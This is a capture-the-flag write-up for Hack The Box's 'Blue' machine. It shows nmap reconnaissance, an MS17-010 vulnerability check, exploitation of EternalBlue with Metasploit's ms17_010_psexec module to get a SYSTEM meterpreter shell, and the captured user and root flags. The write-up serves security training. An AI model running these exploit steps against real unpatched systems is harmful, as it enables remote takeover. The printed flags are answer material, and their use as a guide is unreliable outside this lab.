#HackTheBox 

## <span style="color:#92d050">About</span>

Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.

-------
## <span style="color:#92d050">Recon</span> 

Nmap scan : 
```shell
nmap -A 10.10.10.40 -oN nmap_scan.txt
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-22 02:29 EDT
Nmap scan report for 10.10.10.40
Host is up (0.47s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-08-22T06:41:15
|_  start_date: 2023-08-22T06:37:17
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-22T07:41:17+01:00
|_clock-skew: mean: -10m20s, deviation: 34m35s, median: 9m36s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                               
Nmap done: 1 IP address (1 host up) scanned in 133.51 seconds
```

we have the scan result and we will start enumeration with smb .
Operating system : Window 

----
## SMB - 139,445 

 - We can start enumeration of smb ,

checking if it is vulnerable to eternal blue or not using nmap script :
```shell
nmap -p 445 10.10.10.40 --script smb-vuln-ms17-010
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-22 02:36 EDT
Nmap scan report for 10.10.10.40
Host is up (0.25s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 4.25 seconds
```
and it is vulnerable to eternal blue .

using metasploit module psexec :
```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.40
set LHOST 10.10.16.2
exploit
```

after some seconds we have a meterpreter shell .
```
meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

user.txt :
```
c:\Users\haris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of c:\Users\haris\Desktop

24/12/2017  03:23    <DIR>          .
24/12/2017  03:23    <DIR>          ..
22/08/2023  07:37                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,428,362,752 bytes free

c:\Users\haris\Desktop>type user.txt
type user.txt
89f8e2fdde25c6793b519b92f193dd51
```

root.txt :
```
c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of c:\Users\Administrator\Desktop

24/12/2017  03:22    <DIR>          .
24/12/2017  03:22    <DIR>          ..
22/08/2023  07:37                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,429,272,064 bytes free

c:\Users\Administrator\Desktop>type root.txt 
type root.txt 
4556c26985adb00f6e00bf58e3c0b295

```

